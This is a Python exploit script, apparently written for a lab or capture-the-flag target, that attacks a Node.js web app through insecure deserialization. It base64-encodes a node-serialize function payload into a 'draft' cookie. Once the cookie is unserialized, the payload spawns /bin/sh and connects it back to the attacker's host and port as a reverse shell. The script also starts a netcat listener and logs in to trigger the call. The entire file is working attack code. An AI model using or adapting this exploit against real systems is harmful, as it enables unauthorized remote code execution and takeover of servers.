#!/usr/bin/python3
import subprocess
import requests
import base64
import sys

if len(sys.argv) != 6:
	print('usage: %s target lhost lport username password'%sys.argv[0])
	sys.exit(-1)

target = sys.argv[1]
lhost  = sys.argv[2]
lport  = sys.argv[3]
user   = sys.argv[4]
passwd = sys.argv[5]

# generate the evil cookie
payload = b'{"msg":"_$$ND_FUNC$$_function(){'
payload += b'var net = require(\'net\'),cp = require(\'child_process\'),'
payload += b'sh = cp.spawn(\'/bin/sh\',[]); var client= new net.Socket();'
payload += b'client.connect(%s, \'%s\', function() {'%\
	(lport.encode('utf-8'),lhost.encode('utf-8'))
payload += b'client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);'
payload += b'});return /rce/'
payload += b'}()"}'

draft = base64.b64encode(payload).decode('utf-8')
c = {'draft':draft}
print("(+) Generated cookie!")

# open a netcat listener
print("(*) Starting listener...")
subprocess.Popen(["nc","-nvlp",lport])

# log in, and get the home page to trigger to unserialize call
# takes a couple of times sometimes. not quite sure why
s = requests.Session()
logged_in = False
for try_nr in range(3):
	print("(*) Logging in... (attempt #%d)" % try_nr)
	d = {"username":user,"password":passwd}
	r = s.post('http://%s/auth'%target,data=d,allow_redirects=False)
	r = s.get('http://%s/'%target,cookies=c)
	if "Logged in as" in r.text:
		print("(+) Logged in!")
		break
	else:
		print("(-) Failed to log in...")

while True:
	pass
